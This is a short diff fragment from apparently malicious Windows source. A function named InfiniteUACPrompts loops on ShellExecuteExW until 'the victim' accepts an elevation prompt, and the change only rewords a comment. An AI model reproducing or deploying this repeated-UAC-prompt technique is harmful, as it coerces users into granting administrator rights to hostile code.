@@ -18,7 +18,7 @@ BOOL InfiniteUACPrompts() {
 		if (ShellExecuteExW(&sei))
 			return TRUE;
 
-		// This loop continues unless the victim accepts the UAC prompt...
+		// This loop continues until the victim accepts the UAC prompt...
 	}
 	
 	return TRUE;
